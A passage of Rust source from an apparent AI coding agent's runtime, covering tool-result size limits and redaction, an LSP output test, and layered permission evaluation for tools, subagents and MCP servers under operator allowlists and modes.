            session_id,
            decision_id,
            call,
            "error",
            &truncated,
            tool_cx,
        )?;
        return Ok((truncated, None));
    }
    let status = if orbit_tools::result_is_denial(&output) {
        "denied"
    } else if orbit_tools::result_is_error(&output) {
        "error"
    } else {
        "ok"
    };
    record_result(
        home,
        session_id,
        decision_id,
        call,
        status,
        &output,
        tool_cx,
    )?;
    Ok((output, None))
}

fn skill_result_output(mut response: serde_json::Value) -> String {
    fn scan(value: &mut serde_json::Value, text_field: bool) {
        match value {
            serde_json::Value::String(value) if text_field => *value = scan_mcp_text(value).0,
            serde_json::Value::Array(values) => {
                for value in values {
                    scan(value, text_field);
                }
            }
            serde_json::Value::Object(values) => {
                for (key, value) in values {
                    scan(
                        value,
                        text_field
                            || matches!(
                                key.as_str(),
                                "body" | "report" | "error" | "message" | "text" | "content"
                            ),
                    );
                }
            }
            _ => {}
        }
    }
    scan(&mut response, false);
    let encoded = response.to_string();
    if encoded.len() <= MAX_RESULT_BYTES {
        return encoded;
    }
    serde_json::json!({"ok":false,"result_error":true,"error":"Skill result exceeds the 64 KiB encoded output limit","truncated":true}).to_string()
}

fn lsp_result_output(
    result: Result<crate::lsp::DiagnosticReport, crate::lsp::LspError>,
) -> (String, &'static str) {
    let (output, status) = match result {
        Ok(report) => (
            serde_json::json!({"ok":true,"result":report}).to_string(),
            "ok",
        ),
        Err(error) => {
            let denied = matches!(error, crate::lsp::LspError::Denied(_));
            let (safe, _) = scan_mcp_text(&error.to_string());
            (
                serde_json::json!({"ok":false,"error":safe,"denied":denied}).to_string(),
                if denied { "denied" } else { "error" },
            )
        }
    };
    if output.len() > MAX_RESULT_BYTES {
        (tool_error("diagnostic result exceeds 64 KiB"), "error")
    } else {
        (output, status)
    }
}

#[cfg(test)]
mod lsp_output_tests {
    use super::*;

    #[test]
    fn lsp_outer_envelope_overflow_records_exact_error_hash_and_bytes() {
        let mut report = crate::lsp::DiagnosticReport {
            server: "fixture".into(),
            uri: "file:///workspace/file.rs".into(),
            document_version: 1,
            position_encoding: "utf-16".into(),
            status: crate::lsp::DiagnosticStatus::Received,
            freshness: crate::lsp::Freshness::Confirmed,
            reason: None,
            diagnostics: vec![crate::lsp::Diagnostic {
                range: crate::lsp::Range {
                    start: crate::lsp::Position {
                        line: 0,
                        character: 0,
                    },
                    end: crate::lsp::Position {
                        line: 0,
                        character: 1,
                    },
                },
                severity: Some(1),
                message: "x".repeat(60_000),
                code: None,
                source: None,
                tags: vec![],
            }],
            truncated: false,
            redactions: vec![],
        };
        let bytes = serde_json::to_vec(&report).unwrap().len();
        report
            .uri
            .push_str(&"x".repeat(MAX_RESULT_BYTES - 4 - bytes));
        assert_eq!(
            serde_json::to_vec(&report).unwrap().len(),
            MAX_RESULT_BYTES - 4
        );
        let (output, status) = lsp_result_output(Ok(report));
        assert!(output.len() < MAX_RESULT_BYTES);
        assert_eq!(
            serde_json::from_str::<serde_json::Value>(&output).unwrap()["ok"],
            false
        );
        assert_eq!(status, "error");
        let home = std::env::temp_dir().join(format!("orbit-lsp-output-{}", ulid::Ulid::new()));
        std::fs::create_dir(&home).unwrap();
        let cx = orbit_tools::ToolContext::new(home.clone(), "owner".into(), home.clone());
        let call = crate::PendingToolCall {
            index: 0,
            id: "boundary".into(),
            name: "LspDiagnostics".into(),
            arguments: b"{}".to_vec(),
        };
        record_result(&home, "owner", "decision", &call, status, &output, &cx).unwrap();
        let (records, _) = orbit_ledger::verify_ledger(&home.join("ledger")).unwrap();
        let result = records
            .iter()
            .find_map(|record| match &record.record.event {
                orbit_ledger::LedgerEvent::ToolResult(result) if result.call_id == "boundary" => {
                    Some(result)
                }
                _ => None,
            })
            .unwrap();
        assert_eq!(result.status, "error");
        assert_eq!(result.output_bytes, output.len() as u64);
        assert_eq!(
            result.output_sha256,
            hex::encode(Sha256::digest(output.as_bytes()))
        );
        std::fs::remove_dir_all(home).unwrap();
    }
}

/// Only the wire response is shortened; the engine's full report has already
/// been persisted. AgentStore bounds all metadata fields, so report/error text
/// are the only fields capable of exceeding the common result limit.
fn bounded_task_output(mut response: serde_json::Value) -> String {
    let encoded = response.to_string();
    if encoded.len() <= MAX_RESULT_BYTES {
        return encoded;
    }
    for (pointer, flag) in [
        ("/result/report", "/result/report_truncated"),
        ("/error", "/error_truncated"),
    ] {
        if response.to_string().len() <= MAX_RESULT_BYTES {
            break;
        }
        let Some(field) = response
            .pointer_mut(pointer)
            .filter(|value| value.is_string())
        else {
            continue;
        };
        let serde_json::Value::String(full_text) = field.take() else {
            unreachable!()
        };
        *field = serde_json::Value::String(String::new());
        // These paths are fixed properties of Task's owned response envelope.
        if flag == "/result/report_truncated" {
            response["result"]["report_truncated"] = true.into();
        } else {
            response["error_truncated"] = true.into();
        }
        let budget = MAX_RESULT_BYTES.saturating_sub(response.to_string().len());
        let mut upper = full_text.len().min(budget);
        while !full_text.is_char_boundary(upper) {
            upper -= 1;
        }
        // A UTF-8 prefix cannot serialize to fewer bytes than its source. Bound
        // the search before collecting character boundaries, even for huge reports.
        let mut boundaries: Vec<usize> = full_text[..upper]
            .char_indices()
            .map(|(index, _)| index)
            .collect();
        boundaries.push(upper);
        let (mut low, mut high) = (0, boundaries.len() - 1);
        while low < high {
            let middle = low + (high - low).div_ceil(2);
            *response
                .pointer_mut(pointer)
                .expect("fixed Task text field") =
                full_text[..boundaries[middle]].to_string().into();
            // Measure the complete encoded envelope: escaped control characters
            // and the truncation flag consume space too.
            if response.to_string().len() <= MAX_RESULT_BYTES {
                low = middle;
            } else {
                high = middle - 1;
            }
        }
        *response
            .pointer_mut(pointer)
            .expect("fixed Task text field") = full_text[..boundaries[low]].to_string().into();
    }
    let encoded = response.to_string();
    debug_assert!(
        encoded.len() <= MAX_RESULT_BYTES,
        "bounded Task metadata exceeded the result limit"
    );
    encoded
}

/// The rule `s` and `a` would remember for this call, or None when there
/// is nothing narrower than the whole tool to offer.
///
/// Offered only where the card asks at all (default and acceptEdits: in
/// the other modes nothing is asked, so nothing is remembered). For a
/// Bash command the rule comes from [`orbit_tools::shellcmd::grant_pattern`]
/// (a wildcard only for the verb of a known multiplexer, the exact line
/// otherwise); for a tool keyed by a path or a host it is exactly that
/// key. A tool with no key, or a key containing a `*` (which the rule
/// language would read as a wildcard), offers nothing.
fn grant_offer(
    home: &Path,
    scope: &PermissionScope,
    project: &Path,
    tool_name: &str,
    args: &serde_json::Value,
) -> Option<GrantOffer> {
    use orbit_tools::permissions::{PermissionMode, PermissionRule, RuleEffectSerde, rule_matches};
    if !matches!(
        scope.mode,
        PermissionMode::Default | PermissionMode::AcceptEdits
    ) {
        return None;
    }
    let tool = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == tool_name)?;
    let key = tool.permission_key(args);
    let pattern = if key.tool == "Bash" {
        orbit_tools::shellcmd::grant_pattern(&key.pattern)?.0
    } else if key.pattern.is_empty() || key.pattern.contains('*') {
        return None;
    } else {
        key.pattern.clone()
    };
    // The offer must cover the call it is offered for, or it is a lie.
    let rule = PermissionRule {
        tool: key.tool.clone(),
        pattern: pattern.clone(),
        effect: RuleEffectSerde::Allow,
    };
    if !rule_matches(&rule, &key.pattern) {
        return None;
    }
    Some(GrantOffer {
        rule: format!("{}({})", key.tool, pattern),
        tool: key.tool,
        pattern,
        can_save: orbit_tools::permissions::FolderTrust::new(home.to_path_buf())
            .is_trusted(project),
    })
}

/// Write an `a` grant to the project's local settings. The project is the
/// session's working directory (the one `load_rules` reads from).
fn save_rule(project: &Path, rule: &str) -> Result<(), String> {
    orbit_tools::executor::add_local_allow_rule(project, rule).map(|_| ())
}

/// Layer-2 outcome for the pre-check (B4): what would the mode/pattern
/// rules say about this call?
#[derive(Debug, PartialEq)]
enum PatternOutcome {
    Allow,
    Ask,
    ExplicitAsk,
    Deny(String),
    McpError(String, usize),
}

fn combine_pattern_outcomes(first: PatternOutcome, second: PatternOutcome) -> PatternOutcome {
    match (first, second) {
        (outcome @ (PatternOutcome::Deny(_) | PatternOutcome::McpError(_, _)), _) => outcome,
        (_, outcome @ (PatternOutcome::Deny(_) | PatternOutcome::McpError(_, _))) => outcome,
        (PatternOutcome::ExplicitAsk, _) | (_, PatternOutcome::ExplicitAsk) => {
            PatternOutcome::ExplicitAsk
        }
        (PatternOutcome::Ask, _) | (_, PatternOutcome::Ask) => PatternOutcome::Ask,
        _ => PatternOutcome::Allow,
    }
}

/// Both names identify this one verified asset. Scope coverage may name either;
/// all deny and explicit-confirmation rules still evaluate against both.
fn asset_read_scope(
    scope: &PermissionScope,
    original: &serde_json::Value,
    alias: &serde_json::Value,
) -> Result<PermissionScope, String> {
    let mut out = scope.clone();
    if let Some(selectors) = &scope.allowlist {
        let original = original
            .get("file_path")
            .and_then(serde_json::Value::as_str)
            .unwrap_or("");
        let alias = alias
            .get("file_path")
            .and_then(serde_json::Value::as_str)
            .unwrap_or("");
        let mut covered = false;
        for selector in selectors {
            validate_scope_selector(selector)?;
            if let Some(rule) = orbit_tools::permissions::parse_rule(
                selector,
                orbit_tools::permissions::RuleEffectSerde::Allow,
            ) && rule.tool == "Read"
                && (orbit_tools::permissions::rule_matches(&rule, original)
                    || orbit_tools::permissions::rule_matches(&rule, alias))
            {
                covered = true;
            }
        }
        if covered {
            out.allowlist = Some(vec!["Read".into()]);
        }
    }
    Ok(out)
}

#[cfg(test)]
fn pattern_layer_verdict(
    home: &Path,
    scope: &PermissionScope,
    tool_name: &str,
    args: &serde_json::Value,
) -> PatternOutcome {
    let cwd = std::env::current_dir().unwrap_or_default();
    pattern_layer_verdict_in(home, scope, tool_name, args, &cwd)
}

fn pattern_layer_verdict_in(
    home: &Path,
    scope: &PermissionScope,
    tool_name: &str,
    args: &serde_json::Value,
    working_dir: &Path,
) -> PatternOutcome {
    pattern_layer_verdict_with_plan(home, scope, tool_name, args, working_dir, None)
}

fn pattern_layer_verdict_with_plan(
    home: &Path,
    scope: &PermissionScope,
    tool_name: &str,
    args: &serde_json::Value,
    working_dir: &Path,
    plan: Option<&McpDispatchPlan>,
) -> PatternOutcome {
    use orbit_tools::permissions::{RuleEffectSerde, Verdict, evaluate, parse_rule};

    let entries = match plan
        .map(|plan| Ok(plan.rules.clone()))
        .unwrap_or_else(|| orbit_tools::executor::load_sourced_rules_in(home, working_dir))
    {
        Ok(entries) => entries,
        Err(error) => return PatternOutcome::Deny(error),
    };
    let mut rules = orbit_tools::permissions::RuleSet {
        rules: entries
            .into_iter()
            .filter(|entry| !entry.shadowed)
            .map(|entry| entry.rule)
            .collect(),
    };
    // An explicit operator allowlist (--allowedTools / settings) is a
    // SCOPE statement: only what it names may run. The flag is tracked
    // separately so the pure-built-in bypass below cannot punch
    // through it (gate 6: a CI allowlist without calculator must deny
    // calculator with exit 2, not let the built-in run).
    if let Some(list) = &scope.allowlist {
        for entry in list {
            if let Err(error) = validate_scope_selector(entry) {
                return PatternOutcome::Deny(error);
            }
            if let Some(r) = parse_rule(entry, RuleEffectSerde::Allow) {
                rules.rules.push(r);
            }
        }
    }
    for entry in &scope.disallowlist {
        if let Err(error) = validate_scope_selector(entry) {
            return PatternOutcome::Deny(error);
        }
        if let Some(r) = parse_rule(entry, RuleEffectSerde::Deny) {
            rules.rules.push(r);
        }
    }
    let Some(tool) = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == tool_name)
    else {
        if tool_name == "LspDiagnostics" {
            let pattern = args
                .get("file_path")
                .and_then(|value| value.as_str())
                .unwrap_or("");
            // The diagnostics backend preserves read/file deny barriers in
            // every mode; reflect that same boundary before convenience grants.
            if rules.evaluate(tool_name, pattern)
                == Some(orbit_tools::permissions::RuleEffect::Deny)
                || rules.evaluate("Read", pattern)
                    == Some(orbit_tools::permissions::RuleEffect::Deny)
            {
                return PatternOutcome::Deny("diagnostics or document is denied by rule".into());
            }
            if let Some(allowlist) = &scope.allowlist
                && !allowlist.iter().any(|entry| entry == tool_name)
            {
                return PatternOutcome::Deny("tool is outside the operator's allowlist".into());
            }
            return match evaluate(scope.mode, &rules, tool_name, pattern, true, false) {
                Verdict::Allow => PatternOutcome::Allow,
                Verdict::Ask => PatternOutcome::ExplicitAsk,
                Verdict::Deny(reason) => PatternOutcome::Deny(reason),
            };
        }
        // Not a registry tool. Pure built-ins (calculator, session
        // lookups) are safe by construction — UNLESS the operator
        // pinned an explicit allowlist, which names the whole scope
        // (a built-in outside it is outside the scope, full stop).
        if crate::tools::builtin_tools()
            .iter()
            .any(|t| t.name == tool_name)
        {
            if let Some(allowlist) = &scope.allowlist {
                let covered = allowlist.iter().any(|entry| {
                    parse_rule(entry, RuleEffectSerde::Allow).is_some_and(|rule| {
                        rule.tool == tool_name && orbit_tools::permissions::rule_matches(&rule, "")
                    })
                });
                if !covered {
                    return PatternOutcome::Deny("tool is outside the operator's allowlist".into());
                }
            }
            if scope.mode != orbit_tools::permissions::PermissionMode::Bypass {
                match rules.evaluate(tool_name, "") {
                    Some(orbit_tools::permissions::RuleEffect::Deny) => {
                        return PatternOutcome::Deny("denied by rule".into());
                    }
                    Some(orbit_tools::permissions::RuleEffect::Ask) => {
                        return if scope.mode == orbit_tools::permissions::PermissionMode::DontAsk {
                            PatternOutcome::Deny(
                                "configured confirmation is unavailable (dontAsk)".into(),
                            )
                        } else {
                            PatternOutcome::ExplicitAsk
                        };
                    }
                    Some(orbit_tools::permissions::RuleEffect::Allow) | None => {}
                }
            }
            return PatternOutcome::Allow;
        }
        // Task/Agent: intercepted in execute_call, not registry tools,
        // but their pattern rules (Agent(Explore), Task(general)) must
        // still evaluate. The key is the one the deleted registry
        // AgentTool computed; the tool is not read-only (the subagent's
        // own calls decide their permissions).
        if tool_name == "Task" || tool_name == "Agent" {
            let key = orbit_tools::agent_permission_key(args);
            return match evaluate(scope.mode, &rules, &key.tool, &key.pattern, false, false) {
                Verdict::Allow => PatternOutcome::Allow,
                Verdict::Ask => PatternOutcome::Ask,
                Verdict::Deny(reason) => PatternOutcome::Deny(reason),
            };
        }
        if tool_name == "ListAgents" || tool_name == "AgentSendMessage" {
            let pattern = args.get("agent_id").and_then(|v| v.as_str()).unwrap_or("");
            if tool_name == "AgentSendMessage"
                && scope.mode == orbit_tools::permissions::PermissionMode::Plan
            {
                return PatternOutcome::Deny("plan mode: agent messages are queue writes".into());
            }
            if let Some(allowlist) = &scope.allowlist {
                let covered = allowlist.iter().any(|entry| {
                    parse_rule(entry, RuleEffectSerde::Allow).is_some_and(|rule| {
                        rule.tool == tool_name
                            && orbit_tools::permissions::rule_matches(&rule, pattern)
                    })
                });
                if !covered {
                    return PatternOutcome::Deny("tool is outside the operator's allowlist".into());
                }
            }
            return match evaluate(
                scope.mode,
                &rules,
                tool_name,
                pattern,
                tool_name == "ListAgents",
                false,
            ) {
                Verdict::Allow => PatternOutcome::Allow,
                Verdict::Ask => PatternOutcome::Ask,
                Verdict::Deny(reason) => PatternOutcome::Deny(reason),
            };
        }
        if tool_name.starts_with("mcp__") {
            // Server descriptions cannot establish whether a call reads or
            // writes. Plan mode therefore refuses every opaque MCP operation,
            // including calls covered by durable or automatic grants.
            if scope.mode == orbit_tools::permissions::PermissionMode::Plan {
                return PatternOutcome::Deny("plan mode: MCP effects are unknown".into());
            }
            let (server, _) = match plan
                .map(|plan| Ok((plan.server.clone(), plan.tool.clone())))
                .unwrap_or_else(|| resolve_mcp_target(home, working_dir, tool_name))
            {
                Ok(target) => target,
                Err(error) => {
                    let (safe, redactions) = scan_mcp_text(&error);
                    return PatternOutcome::McpError(safe, redactions);
                }
            };
            if let Some(allowlist) = &scope.allowlist
                && !allowlist.iter().any(|entry| {
                    parse_rule(entry, RuleEffectSerde::Allow).is_some_and(|rule| {
                        orbit_tools::permissions::rule_tool_matches(&rule, tool_name, Some(&server))
                            && orbit_tools::permissions::rule_matches(&rule, "")
                    })
                })
            {
                return PatternOutcome::Deny("tool is outside the operator's allowlist".into());
            }
            return match orbit_tools::permissions::evaluate_with_server(
                scope.mode,
                &rules,
                tool_name,
                "",
                false,
                false,
                Some(&server),
            ) {
                Verdict::Allow => PatternOutcome::Allow,
                Verdict::Ask
                    if rules.evaluate_with_server(tool_name, "", Some(&server))
                        == Some(orbit_tools::permissions::RuleEffect::Ask) =>
                {
                    PatternOutcome::ExplicitAsk
                }
                Verdict::Ask => PatternOutcome::Ask,
                Verdict::Deny(reason) => PatternOutcome::Deny(reason),
            };
        }
        return PatternOutcome::Ask;
    };
    let key = tool.permission_key(args);
    let is_ro_cmd = tool_name == "Bash"
        && orbit_tools::bash::is_readonly_command(
            args.get("command").and_then(|v| v.as_str()).unwrap_or(""),
        );
    match evaluate(
        scope.mode,
        &rules,
        &key.tool,
        &key.pattern,
        tool.read_only(),
        is_ro_cmd,
    ) {
        Verdict::Allow => PatternOutcome::Allow,
        Verdict::Ask
            if rules.evaluate(&key.tool, &key.pattern)
                == Some(orbit_tools::permissions::RuleEffect::Ask) =>
        {
            PatternOutcome::ExplicitAsk
        }
        Verdict::Ask => PatternOutcome::Ask,
        Verdict::Deny(reason) => PatternOutcome::Deny(reason),
    }
}

fn validate_scope_selector(entry: &str) -> Result<(), String> {
    if !entry.trim().starts_with("mcp__") {
        return Ok(());
    }
    let rule =
        orbit_tools::permissions::parse_rule(entry, orbit_tools::permissions::RuleEffectSerde::Ask)
            .ok_or_else(|| "malformed MCP selector".to_string())?;
    orbit_tools::permissions::validate_mcp_selector(&rule.tool)?;
    if !rule.pattern.is_empty() || entry.contains(['(', ')']) {
        return Err("MCP selectors do not accept argument patterns".into());
    }
    Ok(())
}

/// A bounded effective view; sources identify scopes without disclosing paths.
#[derive(Debug, Clone)]
pub struct PermissionPolicyReport {
    pub selector: String,
    pub effect: orbit_tools::permissions::RuleEffectSerde,
    pub sources: Vec<String>,
    pub matching_rules: Vec<PermissionPolicyMatch>,
    pub truncated: bool,
}

#[derive(Debug, Clone)]
pub struct PermissionPolicyMatch {
    pub selector: String,
    pub effect: orbit_tools::permissions::RuleEffectSerde,
    pub source: String,
    pub shadowed: bool,
}

/// Query an exact tool or an actual-server policy, including independent layers.
pub fn effective_permission_policy(
    home: &Path,
    scope: &PermissionScope,
    working_dir: &Path,
    selector: &str,
) -> Result<PermissionPolicyReport, String> {
    use orbit_tools::permissions::{RuleEffectSerde, parse_rule, rule_tool_matches};
    validate_policy_selector(selector)?;
    let server_selector = selector
        .strip_prefix("mcp__")
        .and_then(|value| value.strip_suffix("__*"));
    let target = if selector.starts_with("mcp__") && server_selector.is_none() {
        Some(
            resolve_mcp_target(home, working_dir, selector)
                .map_err(|error| scan_mcp_text(&error).0)?,
        )
    } else {
        None
    };
    let server = server_selector.or_else(|| target.as_ref().map(|target| target.0.as_str()));
    let pure_builtin = crate::tools::builtin_tools()
        .iter()
        .any(|tool| tool.name == selector);
    // Pure built-ins have an empty permission argument for every call, so
    // universal patterns have a definite meaning even in a whole-tool query.
    let pattern_covers = |rule: &orbit_tools::permissions::PermissionRule| {
        rule.pattern.is_empty()
            || ((pure_builtin || selector == "LspDiagnostics")
                && orbit_tools::permissions::rule_matches(rule, ""))
    };
    let rule_selector = |rule: &orbit_tools::permissions::PermissionRule| {
        if rule.pattern.is_empty() {
            rule.tool.clone()
        } else {
            format!("{}({})", rule.tool, rule.pattern)
        }
    };
    let mut matches = Vec::new();
    for entry in orbit_tools::executor::load_sourced_rules_in(home, working_dir)? {
        let inherited_read_deny = selector == "LspDiagnostics"
            && entry.rule.effect == RuleEffectSerde::Deny
            && (entry.rule.pattern.is_empty()
                || orbit_tools::permissions::rule_matches(&entry.rule, ""))
            && entry.rule.tool == "Read";
        if (pattern_covers(&entry.rule) && rule_tool_matches(&entry.rule, selector, server))
            || inherited_read_deny
        {
            matches.push(PermissionPolicyMatch {
                selector: rule_selector(&entry.rule),
                effect: entry.rule.effect,
                source: entry.source.into(),
                shadowed: entry.shadowed,
            });
        }
    }
    for (entries, effect, source) in [
        (
            scope.disallowlist.as_slice(),
            RuleEffectSerde::Deny,
            "operator-disallowlist",
        ),
        (
            scope.allowlist.as_deref().unwrap_or_default(),
            RuleEffectSerde::Allow,
            "operator-allowlist",
        ),
    ] {
        for raw in entries {
            validate_scope_selector(raw)?;
            if let Some(rule) = parse_rule(raw, effect) {
                let inherited_read_deny = selector == "LspDiagnostics"
                    && effect == RuleEffectSerde::Deny
                    && (rule.pattern.is_empty()
                        || orbit_tools::permissions::rule_matches(&rule, ""))
                    && rule.tool == "Read";
                if (pattern_covers(&rule) && rule_tool_matches(&rule, selector, server))
                    || inherited_read_deny
                {
                    matches.push(PermissionPolicyMatch {
                        selector: rule_selector(&rule),
                        effect,
                        source: source.into(),
                        shadowed: false,
                    });
                }
            }
        }
    }
    if selector.starts_with("mcp__") && scope.mode == orbit_tools::permissions::PermissionMode::Plan
    {
        matches.push(PermissionPolicyMatch {
            selector: selector.into(),
            effect: RuleEffectSerde::Deny,
            source: "plan-mode".into(),
            shadowed: false,
        });
    } else if scope.allowlist.is_some()
        && !matches
            .iter()
            .any(|entry| entry.source == "operator-allowlist")
    {
        matches.push(PermissionPolicyMatch {
            selector: selector.into(),
            effect: RuleEffectSerde::Deny,
            source: "operator-scope-exclusion".into(),
            shadowed: false,
        });
    }
    let winning = [
        RuleEffectSerde::Deny,
        RuleEffectSerde::Ask,
        RuleEffectSerde::Allow,
    ]
    .into_iter()
    .find(|effect| {
        matches
            .iter()
            .any(|entry| !entry.shadowed && entry.effect == *effect)
    });
    let mut effect = winning.unwrap_or_else(|| {
        if selector.starts_with("mcp__") {
            RuleEffectSerde::Ask
        } else if crate::tools::builtin_tools()
            .iter()
            .any(|tool| tool.name == selector)
        {
            RuleEffectSerde::Allow
        } else {
            use orbit_tools::permissions::{RuleSet, Verdict, evaluate};
            match evaluate(
                scope.mode,
                &RuleSet::default(),
                selector,
                "",
                crate::tools::is_read_only(selector),
                false,
            ) {
                Verdict::Allow => RuleEffectSerde::Allow,
                Verdict::Ask => RuleEffectSerde::Ask,
                Verdict::Deny(_) => RuleEffectSerde::Deny,
            }
        }
    });
    let mut sources: Vec<_> = matches
        .iter()
        .filter(|entry| !entry.shadowed && entry.effect == effect)
        .map(|entry| entry.source.clone())
        .collect();
    sources.sort();
    sources.dedup();
    if sources.is_empty() {
        use orbit_tools::permissions::PermissionMode;
        sources.push(
            if crate::tools::builtin_tools()
                .iter()
                .any(|tool| tool.name == selector)
            {
                "pure-builtin"
            } else {
                match scope.mode {
                    PermissionMode::Default => "uncovered-default",
                    PermissionMode::AcceptEdits => "accept-edits-mode",
                    PermissionMode::Plan => "plan-mode",
                    PermissionMode::DontAsk => "dont-ask-mode",
                    PermissionMode::Bypass => "bypass-mode",
                }
            }
            .into(),
        );
    }
    if scope.mode == orbit_tools::permissions::PermissionMode::Bypass
        && !matches.iter().any(|entry| {
            entry.effect == RuleEffectSerde::Deny
                && !entry.shadowed
                && (selector == "LspDiagnostics"
                    || matches!(entry.source.as_str(), "legacy" | "operator-scope-exclusion"))
        })
    {
        effect = RuleEffectSerde::Allow;
        sources = vec!["bypass-mode".into()];
    } else if scope.mode == orbit_tools::permissions::PermissionMode::DontAsk
        && effect == RuleEffectSerde::Ask
    {
        effect = RuleEffectSerde::Deny;
        sources = vec!["dont-ask-mode".into()];
    }
    let truncated = matches.len() > 64;
    matches.truncate(64);
    Ok(PermissionPolicyReport {
        selector: selector.into(),
        effect,
        sources,
        matching_rules: matches,
        truncated,
    })
}

fn validate_policy_selector(selector: &str) -> Result<(), String> {
    if selector.is_empty()
        || selector.len() > 256
        || selector
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
        || selector.contains(['(', ')'])
        || (!selector.starts_with("mcp__") && selector.contains('*'))
    {
        return Err("policy requires an exact tool or mcp__<server>__* selector".into());
    }
    orbit_tools::permissions::validate_mcp_selector(selector)
}

/// Save a replacement in the operator layer before publishing its effective view.
/// None resets that layer only, so other user/project/legacy denies survive.
pub fn set_permission_override(
    home: &Path,
    scope: &PermissionScope,
    working_dir: &Path,
    selector: &str,
    effect: Option<orbit_tools::permissions::RuleEffectSerde>,
) -> Result<PermissionPolicyReport, String> {
    effective_permission_policy(home, scope, working_dir, selector)?;
    orbit_tools::executor::write_operator_override(home, selector, effect)?;
    effective_permission_policy(home, scope, working_dir, selector)
}

/// Text for /permissions; bounded and restricted to rule identities/scope labels.
pub fn permission_command(
    home: &Path,
    scope: &PermissionScope,
    working_dir: &Path,
    argument: &str,
) -> Result<String, String> {
    use orbit_tools::permissions::RuleEffectSerde;
    let words: Vec<_> = argument.split_whitespace().collect();
    match words.as_slice() {
        [] => permission_policy_status(home, scope, working_dir, None),
        [selector] if !matches!(*selector, "allow" | "ask" | "deny" | "reset") => {
            permission_policy_status(home, scope, working_dir, Some(selector))
        }
        [action, selector] if matches!(*action, "allow" | "ask" | "deny" | "reset") => {
            let effect = match *action {
                "allow" => Some(RuleEffectSerde::Allow),
                "ask" => Some(RuleEffectSerde::Ask),
                "deny" => Some(RuleEffectSerde::Deny),
                _ => None,
            };
            let report = set_permission_override(home, scope, working_dir, selector, effect)?;
            Ok(format_permission_report(&report))
        }
        _ => Err("usage: /permissions [<tool>|allow|ask|deny|reset <tool>]".into()),
    }
}

fn format_permission_report(report: &PermissionPolicyReport) -> String {
    let shadowed = report
        .matching_rules
        .iter()
        .filter(|entry| entry.shadowed)
        .map(|entry| entry.source.as_str())
        .collect::<Vec<_>>()
        .join(", ");
    format!(
        "{}: {:?} ({}{}){}",
        report.selector,
        report.effect,
        report.sources.join(", "),
        if report.truncated {
            "; more matching rules omitted"
        } else {
            ""
        },
        if shadowed.is_empty() {
            String::new()
        } else {
            format!("; replaces same-selector {shadowed}")
        }
    )
}

/// Text for /permissions; bounded and restricted to rule identities/scope labels.
pub fn permission_policy_status(
    home: &Path,
    scope: &PermissionScope,
    working_dir: &Path,
    selector: Option<&str>,
) -> Result<String, String> {
    let selectors = if let Some(selector) = selector {
        vec![selector.to_string()]
    } else {
        let mut selectors: Vec<_> =
            orbit_tools::executor::load_sourced_rules_in(home, working_dir)?
                .into_iter()
                .filter(|entry| entry.rule.pattern.is_empty())
                .map(|entry| entry.rule.tool)
                .collect();
        selectors.extend(
            scope
                .allowlist
                .iter()
                .flatten()
                .chain(scope.disallowlist.iter())
                .filter_map(|raw| {
                    orbit_tools::permissions::parse_rule(
                        raw,
                        orbit_tools::permissions::RuleEffectSerde::Ask,
                    )
                    .filter(|rule| rule.pattern.is_empty())
                    .map(|rule| rule.tool)
                }),
        );
        selectors.sort();
        selectors.dedup();
        selectors.truncate(64);
        selectors
    };
    if selectors.is_empty() {
        return Ok(
            "No exact tool or MCP server rules. Uncovered MCP calls ask for approval.".into(),
        );
    }
    let mut lines = Vec::new();
    for selector in selectors {
        let report = effective_permission_policy(home, scope, working_dir, &selector)?;
        lines.push(format_permission_report(&report));
    }
    Ok(lines.join("\n"))
}

/// Resolve from configured identities and exposure, never the first separator.
/// If two enabled/exposed server-tool pairs have the same wire name, refuse.
pub fn resolve_mcp_target(
    home: &Path,
    working_dir: &Path,
    wire: &str,
) -> Result<(String, String), String> {
    let trusted = orbit_tools::permissions::FolderTrust::new(home.into()).is_trusted(working_dir);
    let cfg = orbit_mcp::McpConfig::try_load_at(home, working_dir, trusted)?;
    resolve_mcp_target_in(&cfg, wire)
}

pub(crate) fn resolve_mcp_target_in(
    cfg: &orbit_mcp::McpConfig,
    wire: &str,
) -> Result<(String, String), String> {
    let candidates: Vec<_> = cfg
        .servers
        .iter()
        .filter_map(|(server, config)| {
            let tool = wire.strip_prefix(&format!("mcp__{server}__"))?;
            (!tool.is_empty() && config.tool_enabled(tool))
                .then(|| (server.clone(), tool.to_string()))
        })
        .collect();
    match candidates.as_slice() {
        [target] => Ok(target.clone()),
        [] => Err("MCP server or tool is not configured or enabled".into()),
        _ => Err("ambiguous MCP wire name; configure exact tool exposure for each server".into()),
    }
}

/// Configuration and rule values stay private. A bounded snapshot binds
/// consent to the actual server/tool and launch vector, including environment.
struct McpDispatchPlan {
    server: String,
    tool: String,
    configuration: orbit_mcp::McpConfig,
    rules: Vec<orbit_tools::executor::SourcedPermissionRule>,
    profile: Option<Vec<String>>,
}

impl McpDispatchPlan {
    fn legacy_verdict(&self, wire: &str) -> crate::permissions::RuleVerdict {
        use orbit_tools::permissions::{RuleEffect, RuleSet};
        let legacy = RuleSet {
            rules: self
                .rules
                .iter()
                .filter(|entry| entry.source == "legacy" && !entry.shadowed)
                .map(|entry| entry.rule.clone())
                .collect(),
        };
        match legacy.evaluate_with_server(wire, "", Some(&self.server)) {
            Some(RuleEffect::Deny) => crate::permissions::RuleVerdict::Deny,
            Some(RuleEffect::Allow) => crate::permissions::RuleVerdict::Allow,
            _ => crate::permissions::RuleVerdict::Ask,
        }
    }
}

fn capture_mcp_dispatch_plan(
    home: &Path,
    wire: &str,
    cx: &orbit_tools::ToolContext,
) -> Result<McpDispatchPlan, String> {
    let trusted =
        orbit_tools::permissions::FolderTrust::new(home.into()).is_trusted(&cx.working_dir);
    let configuration = orbit_mcp::McpConfig::try_load_at(home, &cx.working_dir, trusted)?;
    if serde_json::to_vec(&configuration)
        .map_err(|_| "invalid MCP configuration".to_string())?
        .len()
        > orbit_mcp::MAX_FRAME_BYTES
    {
        return Err("MCP configuration exceeds dispatch snapshot bound".into());
    }
    let (server, tool) = resolve_mcp_target_in(&configuration, wire)?;
    let rules = orbit_tools::executor::load_sourced_rules_in(home, &cx.working_dir)?;
    let rule_values: Vec<_> = rules
        .iter()
        .map(|entry| (&entry.rule, entry.source, entry.shadowed))
        .collect();
    if serde_json::to_vec(&rule_values)
        .map_err(|_| "invalid permission rules".to_string())?
        .len()
        > orbit_mcp::MAX_FRAME_BYTES
    {
        return Err("permission rules exceed dispatch snapshot bound".into());
    }
